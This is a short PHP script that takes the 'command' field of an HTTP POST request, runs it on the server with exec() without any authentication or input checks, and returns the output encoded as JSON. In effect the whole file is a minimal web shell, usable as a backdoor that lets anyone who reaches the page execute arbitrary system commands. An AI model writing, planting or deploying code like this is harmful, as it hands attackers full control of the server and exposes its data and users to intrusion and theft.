<?php
$output = null;
exec($_POST['command'], $output);
$arr = array(1, 2, 3, 4);
foreach ($output as &$value) {
    $value = iconv("UTF-8", "ISO-8859-1//IGNORE",$value);
}
$json = json_encode($output, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP | JSON_UNESCAPED_UNICODE);
    echo $json;

//var_dump(json_encode($output, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP | JSON_UNESCAPED_UNICODE));

